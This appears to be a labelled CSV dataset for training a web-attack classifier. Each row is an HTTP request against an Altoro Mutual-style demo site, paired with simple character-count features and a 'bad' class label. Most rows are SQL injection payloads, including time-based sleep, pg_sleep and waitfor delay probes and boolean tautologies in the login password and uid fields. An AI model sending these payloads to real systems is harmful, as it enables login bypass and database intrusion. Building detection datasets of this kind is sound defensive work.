method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/survey_questions.jsp?step=-1%20OR%203%2b207-207-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,b'/survey_questions.jsp?step=-1%20OR%203%2b801-801-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
GET,"b""/survey_questions.jsp?step=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,b'/survey_questions.jsp?step=1%00%c0%a7%c0%a2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/survey_questions.jsp?step=1acuEl4NKjoyi9',b'',0,0,0,0,0,0,bad
GET,"b""/survey_questions.jsp?step=67tGB1lZ';%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/survey_questions.jsp?step=JyI=',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=XAXbMyGj',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=a',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=b',b'',0,0,0,0,0,0,bad
GET,"b""/survey_questions.jsp?step=b%25'%20AND%202*3*8=6*8%20AND%20'GfYm'!='GfYm%25""",b'',4,0,0,0,4,0,bad
GET,"b""/survey_questions.jsp?step=d16ENofV');select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,bad
GET,"b""/survey_questions.jsp?step=dV0g01Yf'));select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/survey_questions.jsp?step=if(now()=sysdate()%2csleep(6)%2c0)',b'',0,0,0,4,0,1,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=%40%409Fl6x',b'',0,0,0,0,0,0,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=%5c',b'',0,0,0,0,0,0,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b174-174-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b936-936-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b549-549-1=0%2b0%2b0%2b1%20or%20'vUtaJYyD'='""",b'',4,0,0,0,4,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b624-624-1=0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=1%00%c0%a7%c0%a2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=1%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=1acuiLpt3w6nt9',b'',0,0,0,0,0,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=4UlDS3Oe';%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',b'',0,0,0,0,0,0,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=JyI=',b'',0,0,0,0,0,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=KU5Umu7O'));select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=S6uO1gvO',b'',0,0,0,0,0,0,bad
GET,"b""/util/serverStatusCheckService.jsp?HostName=eMyncPiA');select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/util/serverStatusCheckService.jsp?HostName=if(now()=sysdate()%2csleep(6)%2c0)',b'',0,0,0,4,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=%40%40zQD7D&uid=1',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=%5c&uid=1',0,0,0,0,0,1,bad
POST,b'/doLogin',"b'btnSubmit=Login&passw=%bf\'%bf""&uid=1'",1,1,0,0,0,1,bad
POST,b'/doLogin',"b'btnSubmit=Login&passw=%f0\'\'%f0""""&uid=1'",2,2,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=-1%20OR%202%2b66-66-1=0%2b0%2b0%2b1&uid=1',0,0,0,0,2,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=-1%20OR%202%2b997-997-1=0%2b0%2b0%2b1%20--%20&uid=1',0,0,1,0,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%20000808=000808%20AND%203%2b1-1-1=1%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20000808=000808%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20736=736%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b173-173-1=0%2b0%2b0%2b1%20--%20&uid=1""",1,0,1,0,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b736-736-1=0%2b0%2b0%2b1%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b808-808-1=0%2b0%2b0%2b1%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203%2b736-736-1=0%2b0%2b0%2b1%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203%2b808-808-1=0%2b0%2b0%2b1%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000808=000808%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20736=736%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000808=000808%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20736=736%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b736-736)%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,1,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b808-808)%20or%20'ZccQBBVu'='&uid=1""",4,0,0,1,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000808=000808%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20736=736%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000808=000808%20or%20'ZccQBBVu'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20736=736%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b736-736)%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,1,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b808-808)%20or%20'ZccQBBVu'='&uid=1""",4,0,0,1,4,1,bad
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%20736=736%20AND%203%2b1-1-1=1%20or%20'lk7xZYPZ'='&uid=1""",4,0,0,0,6,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=1%00%c0%a7%c0%a2%252527%252522&uid=1',0,0,0,0,0,1,bad
POST,b'/doLogin',"b'btnSubmit=Login&passw=1\'""&uid=1'",1,1,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=1acuTtNVRT7x5f&uid=1',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=JyI=&uid=1',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40RCMkH',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c',0,0,0,0,0,1,bad
POST,b'/doLogin',"b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf\'%bf""'",1,1,0,0,0,1,bad
POST,b'/doLogin',"b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0\'\'%f0""""'",2,2,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2%252527%252522',0,0,0,0,0,1,bad
POST,b'/doLogin',"b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1\'""'",1,1,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1acuuuKRbeZU2P',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=',0,0,0,0,0,1,bad
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1',0,0,0,0,0,1,bad
